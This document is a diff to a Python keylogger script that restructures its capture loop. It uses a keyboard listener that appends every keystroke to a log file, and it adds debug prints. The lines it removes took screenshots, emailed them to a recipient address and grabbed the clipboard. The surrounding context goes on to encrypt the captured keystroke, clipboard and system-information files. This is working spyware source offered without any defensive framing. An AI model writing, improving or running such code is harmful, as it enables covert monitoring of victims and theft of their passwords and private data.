@@ -165,59 +165,53 @@ stoppingTime = time.time() + time_iteration
 
 
 # # Timer for keylogger
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_press(key):
+    global keys, count
+    print(f"Key pressed: {key}")
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def on_release(key):
+    if key == Key.esc:
+        print("Esc key pressed, exiting...")
+        # Stop listener
+        return False
+    if time.time() > stoppingTime:
+        print("Time limit reached, exiting...")
+        # Stop listener
+        return False
+
+# Keylogger loop
 while number_of_iterations < number_of_iterations_end:
-
     count = 0
-    keys =[]
+    keys = []
 
-    def on_press(key):
-        global keys, count, currentTime
-
-        print(key)
-        keys.append(key)
-        count += 1
-        currentTime = time.time()
-
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys =[]
-
-    def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write('\n')
-                    f.close()
-                elif k.find("Key") == -1:
-                    f.write(k)
-                    f.close()
-
-    def on_release(key):
-        if key == Key.esc:
-            return False
-        if currentTime > stoppingTime:
-            return False
+    # Update the timing for each iteration
+    currentTime = time.time()
+    stoppingTime = currentTime + time_iteration
+    print(f"Starting iteration {number_of_iterations + 1} with time limit {stoppingTime - currentTime} seconds")
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-    if currentTime > stoppingTime:
+    number_of_iterations += 1
 
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
-
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-
-        copy_clipboard()
-
-        number_of_iterations += 1
-
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
-        
+    # Debugging to ensure loop progression
+    print(f"Completed iteration {number_of_iterations}")
 
 # # Encrypt files
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
